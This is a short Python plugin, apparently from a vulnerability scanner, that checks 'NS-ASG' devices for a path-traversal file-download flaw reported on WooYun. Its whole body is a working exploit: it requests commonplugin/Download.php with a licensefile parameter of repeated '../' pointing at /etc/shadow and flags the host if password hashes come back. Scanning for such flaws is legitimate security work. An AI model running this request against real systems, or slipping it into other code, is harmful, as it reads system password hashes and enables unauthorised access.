#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'angel'
#refer :http://wooyun.org/bugs/wooyun-2014-058838

def assign(service, arg):
    if service == "NS-ASG":
        return True, arg

def audit(arg):
    url = arg + "commonplugin/Download.php?licensefile=../../../../../../../../../../etc/shadow"
    code, head, res, errcode,finalurl =  curl.curl(url)
    if res.find('root:$1$') != -1 :
        security_hole('Local File download vulnerability:' + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('NS-ASG', 'http://www.example.com/')[1])
